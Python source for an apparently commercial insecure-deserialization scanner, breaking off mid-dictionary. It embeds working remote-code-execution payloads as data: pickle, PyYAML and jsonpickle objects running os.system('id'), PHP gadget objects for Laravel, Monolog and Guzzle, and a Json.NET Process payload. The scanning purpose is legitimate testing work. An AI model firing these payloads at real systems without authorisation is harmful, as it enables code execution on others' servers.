"""
Insecure Deserialization Scanner - Enterprise Edition v2.0.

Comprehensive insecure deserialization vulnerability detection across multiple
languages, frameworks, and serialization formats. Includes coverage for:
- Java (ysoserial gadget chains, JMX, T3, IIOP, RMI)
- PHP (Magento, Laravel, WordPress, Symfony, Doctrine, PHPGGC)
- Python (pickle, PyYAML, shelve, marshal, jsonpickle)
- .NET (ViewState, BinaryFormatter, ObjectStateFormatter, Json.NET)
- Ruby (Marshal, YAML, ERB)
- Node.js (node-serialize, cryo, funcster)

Implements detection for OWASP Top 10 A8:2017 and CWE-502.
"""

from __future__ import annotations

import asyncio
import base64
import gzip
import hashlib
import json
import re
import struct
import zlib
from dataclasses import dataclass, field
from enum import Enum
from typing import TYPE_CHECKING, Any
from urllib.parse import quote, urljoin, urlencode

import httpx

from scanning.vuln_scanner import Finding, ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


class DeserVulnType(Enum):
    """Types of deserialization vulnerabilities."""
    JAVA_OBJECT = "java_object_deserialization"
    JAVA_RMI = "java_rmi_deserialization"
    JAVA_JMX = "java_jmx_deserialization"
    JAVA_T3 = "weblogic_t3_deserialization"
    JAVA_IIOP = "java_iiop_deserialization"
    JAVA_SPRING = "spring_framework_deserialization"
    PHP_OBJECT = "php_object_injection"
    PHP_PHAR = "php_phar_deserialization"
    PYTHON_PICKLE = "python_pickle_deserialization"
    PYTHON_YAML = "python_yaml_deserialization"
    PYTHON_SHELVE = "python_shelve_deserialization"
    PYTHON_JSONPICKLE = "python_jsonpickle_deserialization"
    DOTNET_VIEWSTATE = "dotnet_viewstate_deserialization"
    DOTNET_BINARY = "dotnet_binaryformatter_deserialization"
    DOTNET_SOAP = "dotnet_soapformatter_deserialization"
    DOTNET_JSON = "dotnet_jsonnet_deserialization"
    DOTNET_FASTJSON = "dotnet_fastjson_deserialization"
    RUBY_MARSHAL = "ruby_marshal_deserialization"
    RUBY_YAML = "ruby_yaml_deserialization"
    RUBY_ERB = "ruby_erb_deserialization"
    NODE_SERIALIZE = "node_serialize_deserialization"
    NODE_CRYO = "node_cryo_deserialization"
    NODE_FUNCSTER = "node_funcster_deserialization"


class GadgetChainType(Enum):
    """Known gadget chain types for various languages."""
    # Java ysoserial gadgets
    COMMONS_COLLECTIONS = "CommonsCollections"
    COMMONS_COLLECTIONS_K1 = "CommonsCollectionsK1"
    COMMONS_COLLECTIONS_K2 = "CommonsCollectionsK2"
    COMMONS_BEANUTILS = "CommonsBeanutils"
    COMMONS_BEANUTILS_183 = "CommonsBeanutils183NOCC"
    SPRING_CORE = "Spring"
    SPRING_CORE_2 = "Spring2"
    HIBERNATE_1 = "Hibernate1"
    HIBERNATE_2 = "Hibernate2"
    JBOSS = "JBossInterceptors"
    JBOSS_1 = "JBossInterceptors1"
    GROOVY_1 = "Groovy1"
    VAADIN_1 = "Vaadin1"
    CLICK_1 = "Click1"
    MYFACES_1 = "Myfaces1"
    MYFACES_2 = "Myfaces2"
    C3P0 = "C3P0"
    C3P0_WRAP = "C3P0WrapperConnPool"
    JRMPCLIENT = "JRMPClient"
    JRMPLISTENER = "JRMPListener"
    URLDNS = "URLDNS"
    FILEUPLOAD_1 = "FileUpload1"
    ASPECTJWEAVER = "AspectJWeaver"
    BeanShell_1 = "BeanShell1"
    Clojure = "Clojure"
    ROME = "ROME"
    JSON_IO = "JSON1"
    JAVASSIST_WELD = "JavassistWeld1"
    JYTHON_1 = "Jython1"
    MOZILLA_RHINO = "MozillaRhino1"
    # PHP PHPGGC gadgets
    GUZZLE_FW1 = "Guzzle/FW1"
    GUZZLE_INFO1 = "Guzzle/INFO1"
    GUZZLE_RCE1 = "Guzzle/RCE1"
    MONOLOG_RCE1 = "Monolog/RCE1"
    MONOLOG_RCE2 = "Monolog/RCE2"
    MONOLOG_RCE3 = "Monolog/RCE3"
    MONOLOG_RCE4 = "Monolog/RCE4"
    MONOLOG_RCE5 = "Monolog/RCE5"
    MONOLOG_RCE6 = "Monolog/RCE6"
    SYMFONY_RCE1 = "Symfony/RCE1"
    SYMFONY_RCE2 = "Symfony/RCE2"
    SYMFONY_RCE3 = "Symfony/RCE3"
    SYMFONY_RCE4 = "Symfony/RCE4"
    SYMFONY_FW1 = "Symfony/FW1"
    SYMFONY_FW2 = "Symfony/FW2"
    LARAVEL_RCE1 = "Laravel/RCE1"
    LARAVEL_RCE2 = "Laravel/RCE2"
    LARAVEL_RCE3 = "Laravel/RCE3"
    LARAVEL_RCE4 = "Laravel/RCE4"
    LARAVEL_RCE5 = "Laravel/RCE5"
    LARAVEL_RCE6 = "Laravel/RCE6"
    LARAVEL_RCE7 = "Laravel/RCE7"
    LARAVEL_RCE8 = "Laravel/RCE8"
    DOCTRINE_FW1 = "Doctrine/FW1"
    DOCTRINE_FW2 = "Doctrine/FW2"
    DOCTRINE_RCE1 = "Doctrine/RCE1"
    DOCTRINE_RCE2 = "Doctrine/RCE2"
    WORDPRESS_RCE1 = "WordPress/RCE1"
    WORDPRESS_P1 = "WordPress/P/PropertyOrientedProgramming1"
    MAGENTO_FW1 = "Magento/FW1"
    MAGENTO_SQLI = "Magento/SQLI1"
    SLIM_RCE1 = "Slim/RCE1"
    YIIFRAMEWORK_RCE1 = "Yii/RCE1"
    YIIFRAMEWORK_RCE2 = "Yii/RCE2"
    CAKEPHP_RCE1 = "CakePHP/RCE1"
    SWIFTMAILER_FW1 = "SwiftMailer/FW1"
    SWIFTMAILER_FW2 = "SwiftMailer/FW2"
    SWIFTMAILER_FW3 = "SwiftMailer/FW3"
    PHPUNIT_RCE1 = "PHPUnit/RCE1"
    # .NET gadgets (ysoserial.net)
    TYPECONFUSE = "TypeConfuseDelegate"
    TYPECONFUSE_FUNC = "TypeConfuseDelegateMono"
    ACTIVITYSURROGATE = "ActivitySurrogateSelector"
    ACTIVITYSURROGATE_DIS = "ActivitySurrogateSelectorFromFile"
    TEXTFORMATTINGRUNPROPERTIES = "TextFormattingRunProperties"
    WINDOWSIDENTITY = "WindowsIdentity"
    WINDOWSPRINCIPAL = "WindowsPrincipal"
    OBJECTDATAPROVIDER = "ObjectDataProvider"
    PAGECONTENT_RCE = "PSObject"
    SESSIONVIEWSTATEWRAPPER = "SessionViewStateWrapper"
    VIEWSTATE_RCE = "ViewState"
    CLAIMSPRINCIPAL = "ClaimsPrincipal"
    # Ruby gadgets
    GEM_INSTALLER = "Gem::Installer"
    GEM_SPECFETCHER = "Gem::SpecFetcher"
    GEM_REQUIREMENT = "Gem::Requirement"
    ERB_TEMPLATE = "ERB"
    NET_BUFFERED = "Net::BufferedIO"


class SerializationFormat(Enum):
    """Serialization format identifiers."""
    JAVA_NATIVE = "java_native_serialization"
    JAVA_XML = "java_xml_serialization"
    JAVA_XSTREAM = "java_xstream"
    PHP_SERIALIZE = "php_native_serialize"
    PHP_PHAR = "php_phar_archive"
    PYTHON_PICKLE = "python_pickle"
    PYTHON_YAML = "python_yaml"
    PYTHON_JSON_PICKLE = "python_jsonpickle"
    PYTHON_MARSHAL = "python_marshal"
    DOTNET_BINARY = "dotnet_binaryformatter"
    DOTNET_SOAP = "dotnet_soapformatter"
    DOTNET_JSON = "dotnet_jsonnet"
    DOTNET_LOS = "dotnet_losformatter"
    DOTNET_OBJECTSTATE = "dotnet_objectstateformatter"
    RUBY_MARSHAL = "ruby_marshal"
    RUBY_YAML = "ruby_yaml"
    NODE_JSON_FUNC = "node_json_function"
    MSGPACK = "msgpack"
    PROTOBUF = "protobuf"
    AMF = "amf_flash"


@dataclass
class DeserTestResult:
    """Result from a deserialization test."""
    vuln_type: DeserVulnType
    gadget_chain: GadgetChainType | None = None
    serialization_format: SerializationFormat | None = None
    parameter: str = ""
    endpoint: str = ""
    evidence: list[str] = field(default_factory=list)
    rce_confirmed: bool = False
    dns_callback: bool = False
    time_based: bool = False
    error_based: bool = False
    response_diff: bool = False
    cve_ids: list[str] = field(default_factory=list)


@dataclass
class FrameworkSignature:
    """Framework identification signature."""
    name: str
    version_pattern: str | None = None
    headers: dict[str, str] = field(default_factory=dict)
    cookies: list[str] = field(default_factory=list)
    body_patterns: list[str] = field(default_factory=list)
    gadget_chains: list[GadgetChainType] = field(default_factory=list)
    cves: list[str] = field(default_factory=list)


class DeserializationScanner(ScanModule):
    """
    Enterprise Insecure Deserialization Scanner v2.0.
    
    Features:
    - Comprehensive ysoserial gadget chain detection (25+ chains)
    - PHP PHPGGC gadget coverage (50+ chains)
    - Python pickle, PyYAML, shelve, jsonpickle vulnerabilities
    - .NET BinaryFormatter, ViewState, Json.NET, ObjectStateFormatter
    - Ruby Marshal, YAML, ERB template injection
    - Node.js node-serialize, cryo, funcster
    - Framework-specific vulnerability detection
    - DNS callback and time-based detection
    - CVE mapping for known vulnerabilities
    - CWE-502 compliance
    """
    
    name = "deserialization_scanner"
    
    # ==================== SERIALIZATION MAGIC BYTES ====================
    
    # Java serialization magic bytes (0xACED0005)
    JAVA_MAGIC = b'\xac\xed\x00\x05'
    JAVA_MAGIC_B64 = "rO0AB"
    JAVA_MAGIC_GZIP = b'\x1f\x8b\x08'  # Gzipped Java objects
    JAVA_XML_START = b'<?xml'
    JAVA_XSTREAM_ROOT = b'<object-stream>'
    
    # PHP serialized object patterns
    PHP_SERIALIZE_PATTERN = re.compile(
        r'(?:^|[^a-zA-Z0-9])(?:O|C|a|s|i|d|b|N|R|r):\d+(?::|;|{)',
        re.IGNORECASE
    )
    PHP_PHAR_MAGIC = b'__HALT_COMPILER();'
    PHP_PHAR_STUB = b'<?php __HALT_COMPILER(); ?>'
    
    # Python pickle opcodes
    PICKLE_MAGIC_V0 = b'('  # Protocol 0
    PICKLE_MAGIC_V1 = b']'  # Protocol 1
    PICKLE_MAGIC_V2 = b'\x80\x02'  # Protocol 2
    PICKLE_MAGIC_V3 = b'\x80\x03'  # Protocol 3
    PICKLE_MAGIC_V4 = b'\x80\x04'  # Protocol 4
    PICKLE_MAGIC_V5 = b'\x80\x05'  # Protocol 5
    
    # .NET serialization headers
    DOTNET_BINARY_MAGIC = b'\x00\x01\x00\x00\x00\xff\xff\xff\xff'
    DOTNET_VIEWSTATE_PREFIX_V1 = b'\xff\x01'
    DOTNET_VIEWSTATE_PREFIX_V2 = b'\xff\xd8'
    
    # Ruby Marshal
    RUBY_MARSHAL_MAGIC = b'\x04\x08'
    
    # .NET ViewState patterns
    VIEWSTATE_PATTERN = re.compile(r'__VIEWSTATE[^"]*"[^"]*"')
    VIEWSTATE_GENERATOR_PATTERN = re.compile(r'__VIEWSTATEGENERATOR[^"]*"([^"]*)"')
    VIEWSTATE_MAC_PATTERN = re.compile(r'__VIEWSTATEMAC')
    
    # ==================== JAVA YSOSERIAL GADGETS ====================
    
    JAVA_GADGET_PAYLOADS = {
        # URLDNS - Safe DNS callback gadget (no execution)
        GadgetChainType.URLDNS: {
            "description": "DNS lookup - safe detection, no RCE",
            "required_libs": [],
            "cves": [],
            "safe_detection": True,
            "base64": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAATYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHQACWxvY2FsaG9zdHQABGh0dHBweHQAGGh0dHA6Ly9sb2NhbGhvc3QvdGVzdHg=",
        },
        # CommonsCollections variants (1-7)
        GadgetChainType.COMMONS_COLLECTIONS: {
            "description": "Apache Commons Collections gadget chains (CC1-CC7)",
            "variants": ["CC1", "CC2", "CC3", "CC4", "CC5", "CC6", "CC7"],
            "detection_classes": [
                "org.apache.commons.collections.Transformer",
                "org.apache.commons.collections.functors.InvokerTransformer",
                "org.apache.commons.collections.functors.ChainedTransformer",
                "org.apache.commons.collections.functors.ConstantTransformer",
                "org.apache.commons.collections.keyvalue.TiedMapEntry",
                "org.apache.commons.collections4.functors.InvokerTransformer",
                "org.apache.commons.collections4.keyvalue.TiedMapEntry",
                "org.apache.commons.collections.map.LazyMap",
            ],
            "required_libs": ["commons-collections:3.1-3.2.1", "commons-collections4:4.0"],
            "cves": ["CVE-2015-7501", "CVE-2015-4852", "CVE-2017-7525"],
        },
        # CommonsBeanutils
        GadgetChainType.COMMONS_BEANUTILS: {
            "description": "Apache Commons BeanUtils gadget",
            "detection_classes": [
                "org.apache.commons.beanutils.BeanComparator",
                "org.apache.commons.beanutils.PropertyUtils",
            ],
            "required_libs": ["commons-beanutils:1.9.x"],
            "cves": ["CVE-2014-0050"],
        },
        # Spring Framework
        GadgetChainType.SPRING_CORE: {
            "description": "Spring Framework gadget chains",
            "variants": ["Spring1", "Spring2"],
            "detection_classes": [
                "org.springframework.beans.factory.ObjectFactory",
                "org.springframework.transaction.jta.JtaTransactionManager",
                "org.springframework.core.io.support.PathMatchingResourcePatternResolver",
                "org.springframework.aop.framework.JdkDynamicAopProxy",
            ],
            "required_libs": ["spring-core:4.x-5.x", "spring-beans:4.x-5.x"],
            "cves": ["CVE-2016-1000027", "CVE-2017-8046", "CVE-2022-22965"],
        },
        # Hibernate
        GadgetChainType.HIBERNATE_1: {
            "description": "Hibernate ORM gadget chains",
            "detection_classes": [
                "org.hibernate.property.BasicPropertyAccessor",
                "org.hibernate.tuple.component.PojoComponentTuplizer",
                "org.hibernate.engine.spi.TypedValue",
                "org.hibernate.type.Type",
            ],
            "required_libs": ["hibernate-core:4.x-5.x"],
            "cves": [],
        },
        # Groovy
        GadgetChainType.GROOVY_1: {
            "description": "Groovy runtime gadget",
            "detection_classes": [
                "groovy.lang.Closure",
                "org.codehaus.groovy.runtime.MethodClosure",
                "org.codehaus.groovy.runtime.ConvertedClosure",
            ],
            "required_libs": ["groovy:2.x"],
            "cves": [],
        },
        # JBoss
        GadgetChainType.JBOSS: {
            "description": "JBoss/WildFly gadget chains",
            "detection_classes": [
                "org.jboss.interceptor.proxy.InterceptorMethodHandler",
                "org.jboss.weld.interceptor.proxy.InterceptorMethodHandler",
            ],
            "required_libs": ["jboss-interceptor-core"],
            "cves": ["CVE-2015-7501", "CVE-2017-12149"],
        },
        # MyFaces
        GadgetChainType.MYFACES_1: {
            "description": "Apache MyFaces ViewState gadget",
            "detection_classes": [
                "org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression",
                "org.apache.myfaces.el.CompositeELResolver",
            ],
            "required_libs": ["myfaces-impl:2.x"],
            "cves": ["CVE-2021-26296"],
        },
        # C3P0
        GadgetChainType.C3P0: {
            "description": "C3P0 connection pool gadget",
            "detection_classes": [
                "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
                "com.mchange.v2.c3p0.PoolBackedDataSource",
                "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase",
            ],
            "required_libs": ["c3p0:0.9.x"],
            "cves": [],
        },
        # JRMPClient - RMI callback
        GadgetChainType.JRMPCLIENT: {
            "description": "Java RMI callback gadget",
            "detection_classes": [
                "sun.rmi.server.UnicastRef",
                "java.rmi.server.UnicastRemoteObject",
            ],
            "required_libs": [],
            "cves": ["CVE-2018-2628"],
        },
        # ROME
        GadgetChainType.ROME: {
            "description": "ROME RSS library gadget",
            "detection_classes": [
                "com.sun.syndication.feed.impl.ObjectBean",
                "com.sun.syndication.feed.impl.EqualsBean",
            ],
            "required_libs": ["rome:1.0"],
            "cves": [],
        },
        # AspectJ Weaver
        GadgetChainType.ASPECTJWEAVER: {
            "description": "AspectJ Weaver file write gadget",
            "detection_classes": [
                "org.aspectj.weaver.tools.cache.SimpleCache",
            ],
            "required_libs": ["aspectjweaver:1.x"],
            "cves": [],
        },
        # Vaadin
        GadgetChainType.VAADIN_1: {
            "description": "Vaadin web framework gadget",
            "detection_classes": [
                "com.vaadin.data.util.PropertysetItem",
                "com.vaadin.data.util.NestedMethodProperty",
            ],
            "required_libs": ["vaadin-server:7.x"],
            "cves": [],
        },
        # Click1
        GadgetChainType.CLICK_1: {
            "description": "Apache Click gadget",
            "detection_classes": [
                "org.apache.click.control.Column",
            ],
            "required_libs": ["click-nodeps:2.3.0"],
            "cves": [],
        },
        # BeanShell
        GadgetChainType.BeanShell_1: {
            "description": "BeanShell interpreter gadget",
            "detection_classes": [
                "bsh.XThis",
                "bsh.Interpreter",
            ],
            "required_libs": ["bsh:2.0b5"],
            "cves": [],
        },
        # Clojure
        GadgetChainType.Clojure: {
            "description": "Clojure runtime gadget",
            "detection_classes": [
                "clojure.core$comp$fn__",
                "clojure.main$eval_opt",
            ],
            "required_libs": ["clojure:1.8.0"],
            "cves": [],
        },
        # Jython
        GadgetChainType.JYTHON_1: {
            "description": "Jython Python interpreter gadget",
            "detection_classes": [
                "org.python.core.PyObject",
                "org.python.core.PyFunction",
            ],
            "required_libs": ["jython-standalone:2.5.2"],
            "cves": [],
        },
        # Mozilla Rhino
        GadgetChainType.MOZILLA_RHINO: {
            "description": "Mozilla Rhino JavaScript engine gadget",
            "detection_classes": [
                "org.mozilla.javascript.NativeError",
                "org.mozilla.javascript.NativeObject",
            ],
            "required_libs": ["js:1.7R2"],
            "cves": [],
        },
    }
    
    # ==================== PHP GADGET CHAINS (PHPGGC) ====================
    
    PHP_GADGET_PAYLOADS = {
        # Guzzle chains
        GadgetChainType.GUZZLE_FW1: {
            "description": "Guzzle HTTP client file write",
            "classes": [
                "GuzzleHttp\\Cookie\\FileCookieJar",
                "GuzzleHttp\\Cookie\\CookieJar",
            ],
            "version": "6.0.0 <= x <= 6.3.3+7.0.0 <= x <= 7.3.0",
            "payloads": {
                "detect": 'O:29:"GuzzleHttp\\Cookie\\FileCookieJar":4:{s:36:"\\0GuzzleHttp\\Cookie\\CookieJar\\0cookies";a:0:{}s:39:"\\0GuzzleHttp\\Cookie\\CookieJar\\0strictMode";b:0;s:41:"\\0GuzzleHttp\\Cookie\\FileCookieJar\\0filename";s:11:"/tmp/pwned";s:52:"\\0GuzzleHttp\\Cookie\\FileCookieJar\\0storeSessionCookies";b:1;}',
            },
            "cves": [],
        },
        GadgetChainType.GUZZLE_RCE1: {
            "description": "Guzzle RCE via FnStream",
            "classes": [
                "GuzzleHttp\\Psr7\\FnStream",
            ],
            "version": "guzzlehttp/psr7 1.x",
            "cves": [],
        },
        # Monolog chains
        GadgetChainType.MONOLOG_RCE1: {
            "description": "Monolog logging library RCE",
            "classes": [
                "Monolog\\Handler\\SyslogUdpHandler",
                "Monolog\\Handler\\BufferHandler",
            ],
            "version": "1.0.0 <= x <= 1.25.0",
            "payloads": {
                "detect": 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\0*\\0socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\0*\\0handler";N;s:13:"\\0*\\0bufferSize";i:-1;s:9:"\\0*\\0buffer";a:1:{i:0;a:2:{s:5:"level";N;s:7:"message";s:2:"id";}}s:8:"\\0*\\0level";N;s:14:"\\0*\\0initialized";b:1;s:14:"\\0*\\0bufferLimit";i:-1;s:13:"\\0*\\0processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}',
            },
            "cves": [],
        },
        GadgetChainType.MONOLOG_RCE2: {
            "description": "Monolog RCE via StreamHandler",
            "classes": ["Monolog\\Handler\\StreamHandler"],
            "version": "1.0.0 <= x <= 2.0.2",
            "cves": [],
        },
        # Symfony chains
        GadgetChainType.SYMFONY_RCE1: {
            "description": "Symfony framework RCE",
            "classes": [
                "Symfony\\Component\\Cache\\Adapter\\ApcuAdapter",
                "Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter",
            ],
            "version": "3.0.0 <= x <= 3.4.34",
            "payloads": {
                "detect": 'O:40:"Symfony\\Component\\Cache\\Adapter\\ApcuAdapter":0:{}',
            },
            "cves": ["CVE-2019-10911", "CVE-2021-21424"],
        },
        GadgetChainType.SYMFONY_RCE4: {
            "description": "Symfony RCE via Process",
            "classes": ["Symfony\\Component\\Process\\Process"],
            "version": "3.0.0 <= x <= 5.2.3",
            "cves": [],
        },
        GadgetChainType.SYMFONY_FW1: {
            "description": "Symfony file write",
            "classes": ["Symfony\\Component\\Finder\\Finder"],
            "version": "2.x - 5.x",
            "cves": [],
        },
        # Laravel chains
        GadgetChainType.LARAVEL_RCE1: {
            "description": "Laravel framework RCE",
            "classes": [
                "Illuminate\\Broadcasting\\PendingBroadcast",
                "Illuminate\\Bus\\Dispatcher",
            ],
            "version": "5.4.0 <= x <= 5.8.35",
            "payloads": {
                "detect": 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\0*\\0events";O:31:"Illuminate\\Bus\\Dispatcher":1:{s:16:"\\0*\\0queueResolver";a:2:{i:0;O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"\\0*\\0queueResolver";s:6:"system";}i:1;s:11:"dispatchNow";}}s:8:"\\0*\\0event";s:2:"id";}',
            },
            "cves": ["CVE-2018-15133", "CVE-2021-3129"],
        },
        GadgetChainType.LARAVEL_RCE5: {
            "description": "Laravel RCE via QueueClosureJob",
            "classes": ["Illuminate\\Queue\\CallQueuedClosure"],
            "version": "5.5.0 <= x",
            "cves": [],
        },
        GadgetChainType.LARAVEL_RCE6: {
            "description": "Laravel RCE via Validation",
            "classes": ["Illuminate\\Validation\\ValidationException"],
            "version": "5.6.0 <= x <= 8.x",
            "cves": [],
        },
        # Doctrine chains
        GadgetChainType.DOCTRINE_FW1: {
            "description": "Doctrine ORM file write",
            "classes": [
                "Doctrine\\Common\\Cache\\FileCache",
                "Doctrine\\Common\\Cache\\PhpFileCache",
            ],
            "version": "doctrine/cache < 1.3.2",
            "cves": [],
        },
        GadgetChainType.DOCTRINE_RCE1: {
            "description": "Doctrine RCE via cache",
            "classes": ["Doctrine\\ORM\\Tools\\Export\\ClassMetadataExporter"],
            "version": "2.x",
            "cves": [],
        },
        # WordPress chains
        GadgetChainType.WORDPRESS_RCE1: {
            "description": "WordPress core RCE",
            "classes": [
                "WP_Query",
                "WP_Comment_Query",
            ],
            "version": "5.x",
            "payloads": {
                "detect": 'O:8:"WP_Query":0:{}',
            },
            "cves": ["CVE-2019-8942", "CVE-2021-24867"],
        },
        GadgetChainType.WORDPRESS_P1: {
            "description": "WordPress property-oriented programming",
            "classes": ["PHPMailer\\PHPMailer\\PHPMailer"],
            "version": "5.x with PHPMailer",
            "cves": [],
        },
        # Magento chains
        GadgetChainType.MAGENTO_FW1: {
            "description": "Magento file write",
            "classes": [
                "Credis_Client",
                "Magento\\Framework\\App\\DeploymentConfig",
            ],
            "version": "2.x",
            "payloads": {
                "detect": 'O:13:"Credis_Client":0:{}',
            },
            "cves": ["CVE-2019-8118", "CVE-2021-21389"],
        },
        GadgetChainType.MAGENTO_SQLI: {
            "description": "Magento SQL injection via unserialize",
            "classes": ["Magento\\Framework\\DB\\Adapter\\Pdo\\Mysql"],
            "version": "2.x",
            "cves": ["CVE-2019-7932"],
        },
        # Slim Framework
        GadgetChainType.SLIM_RCE1: {
            "description": "Slim framework RCE",
            "classes": ["Slim\\Http\\Response"],
            "version": "3.8.1",
            "cves": [],
        },
        # Yii Framework
        GadgetChainType.YIIFRAMEWORK_RCE1: {
            "description": "Yii framework RCE",
            "classes": ["yii\\db\\BatchQueryResult"],
            "version": "2.0.x",
            "cves": ["CVE-2020-15148"],
        },
        # CakePHP
        GadgetChainType.CAKEPHP_RCE1: {
            "description": "CakePHP RCE",
            "classes": ["Cake\\ORM\\TableRegistry"],
            "version": "3.x",
            "cves": [],
        },
        # SwiftMailer
        GadgetChainType.SWIFTMAILER_FW1: {
            "description": "SwiftMailer file write",
            "classes": ["Swift_ByteStream_FileByteStream"],
            "version": "5.x - 6.x",
            "cves": [],
        },
        # PHPUnit
        GadgetChainType.PHPUNIT_RCE1: {
            "description": "PHPUnit RCE via eval",
            "classes": ["PHPUnit_Framework_MockObject_Generator"],
            "version": "3.x - 5.x",
            "cves": ["CVE-2017-9841"],
        },
    }
    
    # ==================== PYTHON DESERIALIZATION ====================
    
    PYTHON_PAYLOADS = {
        "pickle": {
            "description": "Python pickle module RCE",
            # os.system('id') payload - Protocol 0 (most compatible)
            "rce_exec_v0": base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
            # os.system('id') payload - Protocol 4
            "rce_exec_v4": base64.b64encode(
                b'\x80\x04\x95"\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
            ).decode(),
            # subprocess.check_output(['id'])
            "rce_subprocess": base64.b64encode(
                b'\x80\x04\x95-\x00\x00\x00\x00\x00\x00\x00\x8c\nsubprocess\x94\x8c\x0ccheck_output\x94\x93\x94]\x94\x8c\x02id\x94a\x85\x94R\x94.'
            ).decode(),
            # eval(__import__('os').system('id'))
            "rce_eval": base64.b64encode(
                b"c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR."
            ).decode(),
            # exec(os.popen('id').read()) - bypasses some restrictions
            "rce_exec_bypass": base64.b64encode(
                b"c__builtin__\nexec\n(S'import os;os.popen(\"id\").read()'\ntR."
            ).decode(),
            # Detection payload - creates dict (safe)
            "safe_detect": base64.b64encode(
                b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04dict\x94\x93\x94)R\x94.'
            ).decode(),
            "cves": ["CVE-2019-9740", "CVE-2020-10994"],
        },
        "yaml": {
            "description": "PyYAML unsafe load RCE",
            # !!python/object/apply:os.system ['id']
            "rce_basic": "!!python/object/apply:os.system ['id']",
            # Using subprocess
            "rce_subprocess": """!!python/object/new:subprocess.Popen
  args:
    - id
  shell: true""",
            # Check output
            "rce_check_output": "!!python/object/apply:subprocess.check_output [['id']]",
            # Using map with getattr
            "rce_getattr": """!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval, ["__import__('os').system('id')"]]]""",
            # Safe loader bypass attempts
            "rce_bypass_1": "!!python/object/apply:builtins.eval ['__import__(\"os\").system(\"id\")']",
            "rce_bypass_2": "!!python/object/new:bytes [!!python/tuple [!!python/object/apply:os.system ['id']]]",
            "cves": ["CVE-2020-1747", "CVE-2017-18342", "CVE-2020-14343"],
        },
        "shelve": {
            "description": "Python shelve module (uses pickle internally)",
            "note": "shelve uses pickle internally - same payloads apply",
            "cves": [],
        },
        "marshal": {
            "description": "Python marshal module",
            "note": "marshal can execute arbitrary bytecode",
            "cves": [],
        },
        "jsonpickle": {
            "description": "jsonpickle module RCE",
            "rce_payload": '{"py/reduce": [{"py/function": "os.system"}, {"py/tuple": ["id"]}]}',
            "rce_subprocess": '{"py/reduce": [{"py/function": "subprocess.check_output"}, {"py/tuple": [["id"]]}]}',
            "rce_exec": '{"py/reduce": [{"py/function": "builtins.exec"}, {"py/tuple": ["import os; os.system(\'id\')"]}]}',
            "cves": ["CVE-2020-22083"],
        },
    }
    
    # ==================== .NET DESERIALIZATION ====================
    
    DOTNET_PAYLOADS = {
        "viewstate": {
            "description": "ASP.NET ViewState deserialization",
            "attack_vectors": [
                "ViewState without MAC",
                "Weak ViewState encryption key",
                "Known machine key exploitation",
                "ViewState encryption oracle",
            ],
            "decryption_indicators": [
                "machineKey",
                "decryptionKey",
                "validationKey",
            ],
            "cves": ["CVE-2020-0688", "CVE-2020-16952", "CVE-2017-9822"],
        },
        "binaryformatter": {
            "description": ".NET BinaryFormatter gadgets",
            "gadgets": {
                GadgetChainType.TYPECONFUSE: "TypeConfuseDelegate - arbitrary getter calls",
                GadgetChainType.ACTIVITYSURROGATE: "ActivitySurrogateSelector - XAML execution",
                GadgetChainType.TEXTFORMATTINGRUNPROPERTIES: "Process start via XAML",
                GadgetChainType.WINDOWSIDENTITY: "WindowsIdentity - claims transformation",
                GadgetChainType.OBJECTDATAPROVIDER: "ObjectDataProvider - method invocation",
                GadgetChainType.WINDOWSPRINCIPAL: "WindowsPrincipal - identity claims RCE",
                GadgetChainType.CLAIMSPRINCIPAL: "ClaimsPrincipal - claims deserialization",
            },
            # TypeConfuseDelegate stub
            "detection_payload": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5",
            "cves": ["CVE-2017-8565", "CVE-2019-0604", "CVE-2020-1147", "CVE-2021-1678"],
        },
        "soapformatter": {
            "description": ".NET SoapFormatter deserialization",
            "xml_marker": "SOAP-ENV:",
            "cves": [],
        },
        "losformatter": {
            "description": ".NET LosFormatter for ViewState",
            "note": "Limited Object Serialization - used for __VIEWSTATE",
            "cves": [],
        },
        "objectstateformatter": {
            "description": ".NET ObjectStateFormatter",
            "note": "More permissive than LosFormatter",
            "cves": [],
        },
        "jsonnet": {
            "description": "Newtonsoft Json.NET TypeNameHandling",
            "dangerous_settings": [
                "TypeNameHandling.All",
                "TypeNameHandling.Auto",
                "TypeNameHandling.Objects",
                "TypeNameHandling.Arrays",
            ],
            "detection_payloads": [
                '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}',
                '{"$type":"System.IO.FileInfo, mscorlib","fileName":"c:\\\\windows\\\\win.ini"}',
                '{"$type":"System.Data.DataSet, System.Data"}',
            ],
            "cves": ["CVE-2017-8565", "CVE-2019-10782", "CVE-2020-5246"],
        },
        "fastjson": {
            "description": "fastJSON .NET library",
            "cves": [],
